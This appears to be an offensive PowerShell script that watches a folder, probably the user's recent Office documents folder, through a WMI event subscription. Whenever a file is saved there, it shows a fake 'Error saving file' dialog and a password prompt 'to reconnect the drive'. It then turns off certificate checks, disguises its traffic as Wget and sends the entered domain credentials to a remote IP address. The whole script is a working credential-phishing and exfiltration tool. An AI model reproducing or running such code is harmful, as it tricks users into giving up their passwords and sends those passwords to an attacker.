#here to simplify testing 
 #$ErrorActionPreference = "silentlyContinue" 
 #This is not used currently 
     #$URLAddress= "https://200.200.32.134" 
 get-eventsubscriber | unregister-event -verbose
 remove-variable MostRecentEntry 
  
  
 ###################################### 
 #Search for Office based on Registry keys.  
   
if (test-path HKLM:\SOFTWARE\Microsoft\Office\15.0) { 
      
 	if (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\")  { 
 		write-output "MRU path exists" 
 		$MostRecentEntry="C:\Users\ofpagua\Documents" 
 		} 
 } 

  
 #No office found, Lets get path. 
 if (! $MostRecentEntry )	{ 
 	#$MostRecentEntry=read-host "provide path" 
 	$MostRecentEntry="Z:\demo" 
 } 
  
  
 $pathToMonitor = $MostRecentEntry 
 $pathToMonitor = $pathToMonitor.split("\") 
 $pathToMonitorDriverLetter=$pathToMonitor[0] 
 $pathToMonitorPathRemainder="\\" + $pathToMonitor[1..$pathToMonitor.Length] -join "\\" 
  
 $pathToMonitorPathRemainder = $pathToMonitorPathRemainder + "\\" 
  
  
  
  
  
  
 $localComputerName=$env:COMPUTERNAME 
 $query = ("Select * from __instanceCreationEvent within 10 Where targetinstance isa 'cim_datafile' and targetInstance.drive='$pathToMonitorDriverLetter' and targetInstance.Path='$pathToMonitorPathRemainder' and targetInstance.__server='$env:computername'  and not targetInstance.Filename LIKE '~$%'") 
  
 register-wmievent -query $query -sourceIdentifier "MonitorFiles3" -Debug -action {  
     $global:MyEVT=$event 
     $modFileName=$event.sourceEventArgs.newevent.TargetInstance.filename 
     $modExtension=$event.sourceEventArgs.newevent.TargetInstance.extension 
     $modDriveLetter=$event.sourceEventArgs.newevent.TargetInstance.Drive 
     $modfilenameExtension=$modfilename+"."+$modExtension 
  
     Add-Type -AssemblyName Microsoft.VisualBasic 
     [Microsoft.VisualBasic.Interaction]::MsgBox("Unable to reach $modDriveLetter Drive. File $modFileNameExtension was not saved", 'okonly,SystemModal,Information', "Error saving file") 
     $cred = $host.ui.promptforcredential("Enter password to reconnect the $modDriveLetter drive",'',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; 

#$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
    $wc = new-object net.webclient;
    $wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
    $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
    $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
    $result = $wc.downloadstring("http://172.16.7.137")
    } 
